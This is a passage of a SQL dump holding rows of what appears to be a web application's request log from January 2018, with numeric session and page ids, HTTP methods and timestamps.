17:06:38',14),(723,541,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 20:37:08','2018-01-05 17:07:08',12),(724,541,14,NULL,'GET',21,0,0,0,0,NULL,'2018-01-05 20:38:05','2018-01-05 17:08:05',19),(725,541,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 20:40:22','2018-01-05 17:10:22',12),(726,541,19,NULL,'GET',26,0,0,0,0,NULL,'2018-01-05 20:40:35','2018-01-05 17:10:35',19),(727,541,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 20:41:44','2018-01-05 17:11:44',12),(728,541,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 20:41:46','2018-01-05 17:11:46',14),(729,542,22,NULL,'GET',29,0,0,0,0,NULL,'2018-01-05 21:04:21','2018-01-05 17:34:21',NULL),(730,543,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 21:06:23','2018-01-05 17:36:23',NULL),(731,544,1,NULL,'GET',1,0,0,0,0,NULL,'2018-01-05 21:10:38','2018-01-05 17:40:38',NULL),(732,545,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 21:11:50','2018-01-05 17:41:50',NULL),(733,546,22,NULL,'GET',29,0,0,0,0,NULL,'2018-01-05 22:39:38','2018-01-05 19:09:38',NULL),(734,547,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 22:53:43','2018-01-05 19:23:43',NULL),(735,548,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 23:28:27','2018-01-05 19:58:27',NULL),(736,549,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 23:28:30','2018-01-05 19:58:30',12),(737,550,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-05 23:28:41','2018-01-05 19:58:41',38),(738,551,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 23:28:46','2018-01-05 19:58:46',39),(739,552,19,NULL,'GET',26,0,0,0,0,NULL,'2018-01-05 23:36:31','2018-01-05 20:06:31',12),(740,553,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 23:36:37','2018-01-05 20:06:37',40),(741,554,19,NULL,'GET',26,0,0,0,0,NULL,'2018-01-05 23:37:07','2018-01-05 20:07:07',39),(742,555,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 23:37:11','2018-01-05 20:07:11',41),(743,556,20,NULL,'GET',27,0,0,0,0,NULL,'2018-01-05 23:37:17','2018-01-05 20:07:17',19),(744,557,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 23:37:21','2018-01-05 20:07:21',42),(745,558,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 23:37:26','2018-01-05 20:07:26',42),(746,559,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 23:37:32','2018-01-05 20:07:32',42),(747,560,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 23:37:37','2018-01-05 20:07:37',42),(748,561,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 23:37:41','2018-01-05 20:07:41',42),(749,562,20,NULL,'GET',27,0,0,0,0,NULL,'2018-01-05 23:37:46','2018-01-05 20:07:46',43),(750,563,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 23:37:52','2018-01-05 20:07:52',44),(751,564,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 23:37:56','2018-01-05 20:07:56',44),(752,565,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 23:38:01','2018-01-05 20:08:01',44),(753,566,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 23:38:06','2018-01-05 20:08:06',44),(754,567,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 23:38:11','2018-01-05 20:08:11',44),(755,568,21,NULL,'GET',28,0,0,0,0,NULL,'2018-01-05 23:38:16','2018-01-05 20:08:16',19),(756,569,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 23:38:22','2018-01-05 20:08:22',45),(757,570,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 23:38:27','2018-01-05 20:08:27',45),(758,571,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 23:38:31','2018-01-05 20:08:31',45),(759,572,17,NULL,'GET',24,0,0,0,0,NULL,'2018-01-05 23:38:37','2018-01-05 20:08:37',12),(760,573,21,NULL,'GET',28,0,0,0,0,NULL,'2018-01-05 23:38:41','2018-01-05 20:08:41',43),(761,574,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 23:38:46','2018-01-05 20:08:46',46),(762,575,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 23:38:52','2018-01-05 20:08:52',46),(763,576,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-05 23:38:56','2018-01-05 20:08:56',46),(764,577,15,NULL,'GET',22,0,0,0,0,NULL,'2018-01-05 23:39:01','2018-01-05 20:09:01',19),(765,578,17,NULL,'GET',24,0,0,0,0,NULL,'2018-01-05 23:39:07','2018-01-05 20:09:07',39),(766,579,15,NULL,'GET',22,0,0,0,0,NULL,'2018-01-05 23:39:12','2018-01-05 20:09:12',43),(767,580,23,NULL,'GET',30,0,0,0,0,NULL,'2018-01-05 23:39:16','2018-01-05 20:09:16',19),(768,581,23,NULL,'GET',30,0,0,0,0,NULL,'2018-01-05 23:39:22','2018-01-05 20:09:22',43),(769,582,13,NULL,'GET',20,0,0,0,0,NULL,'2018-01-05 23:39:27','2018-01-05 20:09:27',19),(770,583,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-06 01:47:10','2018-01-05 22:17:10',NULL),(771,584,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-06 03:09:26','2018-01-05 23:39:26',NULL),(772,585,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-06 03:24:49','2018-01-05 23:54:49',NULL),(773,586,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-06 03:25:47','2018-01-05 23:55:47',NULL),(774,587,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-06 03:35:28','2018-01-06 00:05:28',NULL),(775,588,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-06 04:04:57','2018-01-06 00:34:57',12),(776,589,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-06 04:53:30','2018-01-06 01:23:30',12),(777,590,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-06 04:59:37','2018-01-06 01:29:37',47),(778,591,14,NULL,'GET',21,0,0,0,0,NULL,'2018-01-06 05:34:15','2018-01-06 02:04:15',14),(779,592,1,NULL,'GET',1,0,0,0,0,NULL,'2018-01-06 06:46:38','2018-01-06 03:16:38',48),(780,592,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-06 06:46:49','2018-01-06 03:16:49',48),(781,592,19,NULL,'GET',26,0,0,0,0,NULL,'2018-01-06 06:47:44','2018-01-06 03:17:44',12),(782,592,17,NULL,'GET',24,0,0,0,0,NULL,'2018-01-06 06:47:46','2018-01-06 03:17:46',12),(783,592,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-06 06:47:50','2018-01-06 03:17:50',12),(784,592,20,NULL,'GET',27,0,0,0,0,NULL,'2018-01-06 06:48:18','2018-01-06 03:18:18',19),(785,592,12,NULL,'GET',19,0,0,0,0,NULL,'2018-01-06 06:48:28','2018-01-06 03:18:28',19),(786,593,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-06 07:31:34','2018-01-06 04:01:34',NULL),(787,594,19,NULL,'GET',26,0,0,0,0,NULL,'2018-01-06 07:54:32','2018-01-06 04:24:32',NULL),(788,595,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-06 08:32:15','2018-01-06 05:02:15',NULL),(789,596,25,NULL,'GET',32,0,0,0,0,NULL,'2018-01-06 08:44:14','2018-01-06 05:14:14',NULL),(790,597,25,NULL,'GET',32,0,0,0,0,NULL,'2018-01-06 09:00:17','2018-01-06 05:30:17',NULL),(791,598,25,NULL,'GET',32,0,0,0,0,NULL,'2018-01-06 09:15:44','2018-01-06 05:45:44',NULL),(792,599,25,NULL,'GET',32,0,0,0,0,NULL,'2018-01-06 09:34:11','2018-01-06 06:04:11',NULL),(793,600,21,NULL,'GET',28,0,0,0,0,NULL,'2018-01-06 09:37:53','2018-01-06 06:07:53',NULL),(794,601,23,NULL,'GET',30,0,0,0,0,NULL,'2018-01-06 09:38:00','2018-01-06 06:08:00',NULL),(795,602,23,NULL,'GET',30,0,0,0,0,NULL,'2018-01-06 09:38:08','2018-01-06 06:08:08',NULL),(796,603,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-06 09:57:56','2018-01-06 06:27:56',12),(797,604,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-06 09:57:56','2018-01-06 06:27:56',11),(798,605,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-06 11:57:57','2018-01-06 08:27:57',NULL),(799,606,17,NULL,'GET',24,0,0,0,0,NULL,'2018-01-06 12:09:21','2018-01-06 08:39:21',NULL),(800,607,22,NULL,'GET',29,0,0,0,0,NULL,'2018-01-06 12:09:26','2018-01-06 08:39:26',NULL),(801,608,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-06 12:28:45','2018-01-06 08:58:45',49),(802,609,2,NULL,'HEAD',5,0,0,0,0,NULL,'2018-01-06 13:28:00','2018-01-06 09:58:00',24),(803,610,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-06 14:56:09','2018-01-06 11:26:09',50),(804,611,22,NULL,'GET',29,0,0,0,0,NULL,'2018-01-06 16:37:38','2018-01-06 13:07:38',NULL),(805,612,18,NULL,'GET',25,0,0,0,0,NULL,'2018-01-06 16:38:02','2018-01-06 13:08:02',NULL),(806,613,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-06 16:54:54','2018-01-06 13:24:54',NULL),(807,614,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-06 18:44:49','2018-01-06 15:14:49',NULL),(808,615,14,NULL,'GET',21,0,0,0,0,NULL,'2018-01-06 21:43:13','2018-01-06 18:13:13',14),(809,616,21,NULL,'GET',28,0,0,0,0,NULL,'2018-01-07 02:28:11','2018-01-06 22:58:11',NULL),(810,617,23,NULL,'GET',30,0,0,0,0,NULL,'2018-01-07 02:28:25','2018-01-06 22:58:25',NULL),(811,618,1,NULL,'GET',1,0,0,0,0,NULL,'2018-01-07 02:28:41','2018-01-06 22:58:41',NULL),(812,619,24,NULL,'GET',31,0,0,0,0,NULL,'2018-01-07 02:28:54','2018-01-06 22:58:54',NULL),(813,620,12,NULL,'GET',19,0,0,0,0,NULL,'2018-01-07 02:29:11','2018-01-06 22:59:11',NULL),(814,621,13,NULL,'GET',20,0,0,0,0,NULL,'2018-01-07 02:29:25','2018-01-06 22:59:25',NULL),(815,622,14,NULL,'GET',21,0,0,0,0,NULL,'2018-01-07 02:29:37','2018-01-06 22:59:37',NULL),(816,623,15,NULL,'GET',22,0,0,0,0,NULL,'2018-01-07 02:29:46','2018-01-06 22:59:46',NULL),(817,624,18,NULL,'GET',25,0,0,0,0,NULL,'2018-01-07 02:29:59','2018-01-06 22:59:59',NULL),(818,625,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-07 03:09:10','2018-01-06 23:39:10',NULL),(819,626,2,NULL,'HEAD',5,0,0,0,0,NULL,'2018-01-07 03:33:40','2018-01-07 00:03:40',23),(820,627,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-07 03:50:35','2018-01-07 00:20:35',NULL),(821,628,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-07 03:52:09','2018-01-07 00:22:09',NULL),(822,629,25,NULL,'GET',32,0,0,0,0,NULL,'2018-01-07 04:39:24','2018-01-07 01:09:24',NULL),(823,629,25,NULL,'POST',33,0,0,0,0,NULL,'2018-01-07 04:39:32','2018-01-07 01:09:32',20),(824,629,4,NULL,'GET',7,0,0,0,0,NULL,'2018-01-07 04:43:21','2018-01-07 01:13:21',9),(825,629,6,NULL,'GET',9,1,0,0,0,NULL,'2018-01-07 04:43:23','2018-01-07 01:13:23',10),(826,629,5,NULL,'GET',8,1,0,0,0,NULL,'2018-01-07 04:43:23','2018-01-07 01:13:23',10),(827,629,7,NULL,'GET',10,1,0,0,0,NULL,'2018-01-07 04:43:23','2018-01-07 01:13:23',10),(828,629,11,NULL,'POST',18,0,0,0,0,13,'2018-01-07 04:44:40','2018-01-07 01:14:40',51),(829,629,11,NULL,'POST',18,0,0,0,0,13,'2018-01-07 04:45:11','2018-01-07 01:15:11',52),(830,630,25,NULL,'GET',32,0,0,0,0,NULL,'2018-01-07 04:45:28','2018-01-07 01:15:28',NULL),(831,631,12,NULL,'GET',19,0,0,0,0,NULL,'2018-01-07 05:43:39','2018-01-07 02:13:39',14),(832,632,2,NULL,'HEAD',5,0,0,0,0,NULL,'2018-01-07 08:20:58','2018-01-07 04:50:58',28),(833,633,17,NULL,'GET',24,0,0,0,0,NULL,'2018-01-07 09:52:22','2018-01-07 06:22:22',NULL),(834,634,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-07 09:56:58','2018-01-07 06:26:58',NULL),(835,635,19,NULL,'GET',26,0,0,0,0,NULL,'2018-01-07 09:57:01','2018-01-07 06:27:01',NULL),(836,636,28,NULL,'GET',43,0,0,0,0,NULL,'2018-01-07 09:57:03','2018-01-07 06:27:03',NULL),(837,637,24,NULL,'GET',31,0,0,0,0,NULL,'2018-01-07 09:57:06','2018-01-07 06:27:06',NULL),(838,638,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-07 10:02:59','2018-01-07 06:32:59',11),(839,639,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-07 10:02:59','2018-01-07 06:32:59',12),(840,640,17,NULL,'GET',24,0,0,0,0,NULL,'2018-01-07 10:05:21','2018-01-07 06:35:21',NULL),(841,641,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-07 11:32:32','2018-01-07 08:02:32',NULL),(842,642,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-07 11:33:02','2018-01-07 08:03:02',NULL),(843,643,24,NULL,'GET',31,0,0,0,0,NULL,'2018-01-07 13:32:37','2018-01-07 10:02:37',NULL),(844,644,12,NULL,'GET',19,0,0,0,0,NULL,'2018-01-07 13:32:40','2018-01-07 10:02:40',NULL),(845,645,13,NULL,'GET',20,0,0,0,0,NULL,'2018-01-07 13:32:43','2018-01-07 10:02:43',NULL),(846,646,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-07 13:59:28','2018-01-07 10:29:28',NULL),(847,647,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-07 14:09:32','2018-01-07 10:39:32',NULL),(848,648,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-07 14:36:32','2018-01-07 11:06:32',NULL),(849,649,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-07 15:04:25','2018-01-07 11:34:25',NULL),(850,650,19,NULL,'GET',26,0,0,0,0,NULL,'2018-01-07 17:21:13','2018-01-07 13:51:13',NULL),(851,651,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-07 17:22:29','2018-01-07 13:52:29',12),(852,652,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-07 17:35:46','2018-01-07 14:05:46',NULL),(853,653,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-07 18:31:19','2018-01-07 15:01:19',53),(854,654,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-07 20:36:57','2018-01-07 17:06:57',NULL),(855,655,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-07 20:42:40','2018-01-07 17:12:40',NULL),(856,656,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-08 00:44:43','2018-01-07 21:14:43',54),(857,657,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-08 01:06:46','2018-01-07 21:36:46',NULL),(858,658,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-08 01:27:50','2018-01-07 21:57:50',NULL),(859,659,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-08 01:36:16','2018-01-07 22:06:16',NULL),(860,660,24,NULL,'GET',31,0,0,0,0,NULL,'2018-01-08 01:38:27','2018-01-07 22:08:27',NULL),(861,661,12,NULL,'GET',19,0,0,0,0,NULL,'2018-01-08 01:39:36','2018-01-07 22:09:36',NULL),(862,662,13,NULL,'GET',20,0,0,0,0,NULL,'2018-01-08 01:39:39','2018-01-07 22:09:39',NULL),(863,663,14,NULL,'GET',21,0,0,0,0,NULL,'2018-01-08 01:40:11','2018-01-07 22:10:11',NULL),(864,664,1,NULL,'GET',1,0,0,0,0,NULL,'2018-01-08 01:40:15','2018-01-07 22:10:15',NULL),(865,665,14,NULL,'GET',21,0,0,0,0,NULL,'2018-01-08 01:40:18','2018-01-07 22:10:18',NULL),(866,666,15,NULL,'GET',22,0,0,0,0,NULL,'2018-01-08 01:40:21','2018-01-07 22:10:21',NULL),(867,667,2,NULL,'HEAD',5,0,0,0,0,NULL,'2018-01-08 02:11:23','2018-01-07 22:41:23',28),(868,668,17,NULL,'GET',24,0,0,0,0,NULL,'2018-01-08 02:27:24','2018-01-07 22:57:24',NULL),(869,669,22,NULL,'GET',29,0,0,0,0,NULL,'2018-01-08 02:27:33','2018-01-07 22:57:33',NULL),(870,670,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-08 02:33:40','2018-01-07 23:03:40',11),(871,671,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-08 02:38:58','2018-01-07 23:08:58',12),(872,672,2,NULL,'HEAD',5,0,0,0,0,NULL,'2018-01-08 03:17:10','2018-01-07 23:47:10',28),(873,673,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-08 03:35:01','2018-01-08 00:05:01',NULL),(874,674,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-08 03:57:59','2018-01-08 00:27:59',NULL),(875,675,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-08 04:40:08','2018-01-08 01:10:08',NULL),(876,676,22,NULL,'GET',29,0,0,0,0,NULL,'2018-01-08 04:40:11','2018-01-08 01:10:11',NULL),(877,677,17,NULL,'GET',24,0,0,0,0,NULL,'2018-01-08 04:40:14','2018-01-08 01:10:14',NULL),(878,678,19,NULL,'GET',26,0,0,0,0,NULL,'2018-01-08 04:40:17','2018-01-08 01:10:17',NULL),(879,679,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-08 04:40:20','2018-01-08 01:10:20',NULL),(880,680,1,NULL,'GET',1,0,0,0,0,NULL,'2018-01-08 04:40:25','2018-01-08 01:10:25',NULL),(881,681,23,NULL,'GET',30,0,0,0,0,NULL,'2018-01-08 04:40:28','2018-01-08 01:10:28',NULL),(882,682,21,NULL,'GET',28,0,0,0,0,NULL,'2018-01-08 04:40:31','2018-01-08 01:10:31',NULL),(883,683,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-08 04:40:34','2018-01-08 01:10:34',NULL),(884,684,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-08 04:40:37','2018-01-08 01:10:37',NULL),(885,685,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-08 04:40:40','2018-01-08 01:10:40',NULL),(886,686,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-08 04:40:43','2018-01-08 01:10:43',NULL),(887,687,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-08 04:40:46','2018-01-08 01:10:46',NULL),(888,688,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-08 04:40:49','2018-01-08 01:10:49',NULL),(889,689,18,NULL,'GET',25,0,0,0,0,NULL,'2018-01-08 04:40:51','2018-01-08 01:10:51',NULL),(890,690,20,NULL,'GET',27,0,0,0,0,NULL,'2018-01-08 04:40:54','2018-01-08 01:10:54',NULL),(891,691,14,NULL,'GET',21,0,0,0,0,NULL,'2018-01-08 04:40:57','2018-01-08 01:10:57',NULL),(892,692,15,NULL,'GET',22,0,0,0,0,NULL,'2018-01-08 04:41:00','2018-01-08 01:11:00',NULL),(893,693,13,NULL,'GET',20,0,0,0,0,NULL,'2018-01-08 04:41:03','2018-01-08 01:11:03',NULL),(894,694,12,NULL,'GET',19,0,0,0,0,NULL,'2018-01-08 04:41:06','2018-01-08 01:11:06',NULL),(895,695,24,NULL,'GET',31,0,0,0,0,NULL,'2018-01-08 04:41:09','2018-01-08 01:11:09',NULL),(896,696,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-08 04:41:22','2018-01-08 01:11:22',NULL),(897,697,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-08 04:41:25','2018-01-08 01:11:25',NULL),(898,698,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-08 04:41:28','2018-01-08 01:11:28',NULL),(899,699,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-08 04:41:31','2018-01-08 01:11:31',NULL),(900,700,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-08 04:41:34','2018-01-08 01:11:34',NULL),(901,701,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-08 04:41:37','2018-01-08 01:11:37',NULL),(902,702,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-08 04:41:40','2018-01-08 01:11:40',NULL),(903,703,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-08 04:42:01','2018-01-08 01:12:01',NULL),(904,704,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-08 05:34:56','2018-01-08 02:04:56',NULL),(905,705,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-08 06:17:18','2018-01-08 02:47:18',NULL),(906,706,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-08 06:53:19','2018-01-08 03:23:19',NULL),(907,707,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-08 07:22:37','2018-01-08 03:52:37',NULL),(908,708,17,NULL,'GET',24,0,0,0,0,NULL,'2018-01-08 08:17:26','2018-01-08 04:47:26',NULL),(909,709,15,NULL,'GET',22,0,0,0,0,NULL,'2018-01-08 08:19:59','2018-01-08 04:49:59',12),(910,710,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-08 08:40:38','2018-01-08 05:10:38',12),(911,711,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-08 08:41:03','2018-01-08 05:11:03',12),(912,712,25,NULL,'GET',32,0,0,0,0,NULL,'2018-01-08 08:55:49','2018-01-08 05:25:49',NULL),(913,712,25,NULL,'POST',33,0,0,0,0,NULL,'2018-01-08 08:55:57','2018-01-08 05:25:57',20),(914,712,11,NULL,'POST',18,0,0,0,0,13,'2018-01-08 09:27:41','2018-01-08 05:57:41',21),(915,713,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-08 09:49:56','2018-01-08 06:19:56',NULL),(916,714,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-08 10:42:50','2018-01-08 07:12:50',NULL),(917,715,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-08 10:43:32','2018-01-08 07:13:32',NULL),(918,716,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-08 10:44:06','2018-01-08 07:14:06',NULL),(919,717,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-08 10:53:49','2018-01-08 07:23:49',NULL),(920,718,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-08 11:09:07','2018-01-08 07:39:07',NULL),(921,719,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-08 11:19:08','2018-01-08 07:49:08',11),(922,720,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-08 11:19:10','2018-01-08 07:49:10',12),(923,721,1,NULL,'GET',1,0,0,0,0,NULL,'2018-01-08 11:37:31','2018-01-08 08:07:31',NULL),(924,722,19,NULL,'GET',26,0,0,0,0,NULL,'2018-01-08 11:43:17','2018-01-08 08:13:17',NULL),(925,723,17,NULL,'GET',24,0,0,0,0,NULL,'2018-01-08 11:51:50','2018-01-08 08:21:50',NULL),(926,724,15,NULL,'GET',22,0,0,0,0,NULL,'2018-01-08 11:51:55','2018-01-08 08:21:55',NULL),(927,725,18,NULL,'GET',25,0,0,0,0,NULL,'2018-01-08 11:52:07','2018-01-08 08:22:07',NULL),(928,726,2,NULL,'HEAD',5,0,0,0,0,NULL,'2018-01-08 13:31:38','2018-01-08 10:01:38',28),(929,727,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-08 13:48:13','2018-01-08 10:18:13',NULL),(930,728,21,NULL,'GET',28,0,0,0,0,NULL,'2018-01-08 14:27:59','2018-01-08 10:57:59',NULL),(931,729,21,NULL,'GET',28,0,0,0,0,NULL,'2018-01-08 15:35:11','2018-01-08 12:05:11',NULL),(932,730,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-08 15:37:16','2018-01-08 12:07:16',NULL),(933,731,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-08 16:15:27','2018-01-08 12:45:27',14),(934,731,23,NULL,'GET',30,0,0,0,0,NULL,'2018-01-08 16:22:00','2018-01-08 12:52:00',19),(935,731,1,NULL,'GET',1,0,0,0,0,NULL,'2018-01-08 16:22:03','2018-01-08 12:52:03',19),(936,731,18,NULL,'GET',25,0,0,0,0,NULL,'2018-01-08 16:22:20','2018-01-08 12:52:20',19),(937,731,14,NULL,'GET',21,0,0,0,0,NULL,'2018-01-08 16:22:23','2018-01-08 12:52:23',19),(938,731,15,NULL,'GET',22,0,0,0,0,NULL,'2018-01-08 16:22:34','2018-01-08 12:52:34',19),(939,731,13,NULL,'GET',20,0,0,0,0,NULL,'2018-01-08 16:22:35','2018-01-08 12:52:35',19),(940,732,25,NULL,'GET',32,0,0,0,0,NULL,'2018-01-08 17:44:35','2018-01-08 14:14:35',NULL),(941,732,25,NULL,'POST',33,0,0,0,0,NULL,'2018-01-08 17:44:38','2018-01-08 14:14:38',20),(942,733,1,NULL,'GET',1,0,0,0,0,NULL,'2018-01-08 17:51:33','2018-01-08 14:21:33',NULL),(943,734,21,NULL,'GET',28,0,0,0,0,NULL,'2018-01-08 18:03:21','2018-01-08 14:33:21',NULL),(944,735,23,NULL,'GET',30,0,0,0,0,NULL,'2018-01-08 18:03:24','2018-01-08 14:33:24',NULL),(945,736,1,NULL,'GET',1,0,0,0,0,NULL,'2018-01-08 18:03:26','2018-01-08 14:33:26',NULL),(946,737,24,NULL,'GET',31,0,0,0,0,NULL,'2018-01-08 18:03:29','2018-01-08 14:33:29',NULL),(947,738,12,NULL,'GET',19,0,0,0,0,NULL,'2018-01-08 18:03:31','2018-01-08 14:33:31',NULL),(948,739,13,NULL,'GET',20,0,0,0,0,NULL,'2018-01-08 18:03:34','2018-01-08 14:33:34',NULL),(949,740,14,NULL,'GET',21,0,0,0,0,NULL,'2018-01-08 18:03:36','2018-01-08 14:33:36',NULL),(950,741,15,NULL,'GET',22,0,0,0,0,NULL,'2018-01-08 18:03:39','2018-01-08 14:33:39',NULL),(951,742,18,NULL,'GET',25,0,0,0,0,NULL,'2018-01-08 18:03:41','2018-01-08 14:33:41',NULL),(952,743,16,NULL,'GET',23,0,0,0,0,NULL,'2018-01-08 19:59:20','2018-01-08 16:29:20',NULL),(953,744,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-08 20:13:48','2018-01-08 16:43:48',NULL),(954,745,21,NULL,'GET',28,0,0,0,0,NULL,'2018-01-08 20:59:28','2018-01-08 17:29:28',NULL),(955,746,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-08 22:34:06','2018-01-08 19:04:06',11),(956,747,2,NULL,'HEAD',5,0,0,0,0,NULL,'2018-01-08 23:04:08','2018-01-08 19:34:08',24),(957,748,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-09 00:25:22','2018-01-08 20:55:22',NULL),(958,749,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-09 01:29:42','2018-01-08 21:59:42',NULL),(959,750,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-09 02:08:53','2018-01-08 22:38:53',NULL),(960,751,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-09 05:44:37','2018-01-09 02:14:37',11),(961,752,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-09 05:59:16','2018-01-09 02:29:16',12),(962,753,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-09 06:56:37','2018-01-09 03:26:37',NULL),(963,754,15,NULL,'GET',22,0,0,0,0,NULL,'2018-01-09 07:52:25','2018-01-09 04:22:25',14),(964,755,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-09 09:25:13','2018-01-09 05:55:13',NULL),(965,756,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-09 09:55:47','2018-01-09 06:25:47',NULL),(966,757,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-09 09:58:57','2018-01-09 06:28:57',NULL),(967,759,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-09 11:12:46','2018-01-09 07:42:46',11),(968,758,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-09 11:12:46','2018-01-09 07:42:46',12),(969,760,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-09 12:18:29','2018-01-09 08:48:29',NULL),(970,761,2,NULL,'HEAD',5,0,0,0,0,NULL,'2018-01-09 12:26:15','2018-01-09 08:56:15',24),(971,762,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-09 12:34:32','2018-01-09 09:04:32',11),(972,763,2,NULL,'GET',5,0,0,0,0,NULL,'2018-01-09 12:35:20','2018-01-09 09:05:20',12),(973,764,25,NULL,'GET',32,0,0,0,0,NULL,'2018-01-09 13:25:11','2018-01-09 09:55:11',NULL),(974,764,25,NULL,'POST',33,0,0,0,0,NULL,'2018-01-09 13:25:15','2018-01-09 09:55:15',20),(975,764,25,NULL,'GET',32,0,0,0,0,NULL,'2018-01-09 13:25:16','2018-01-09 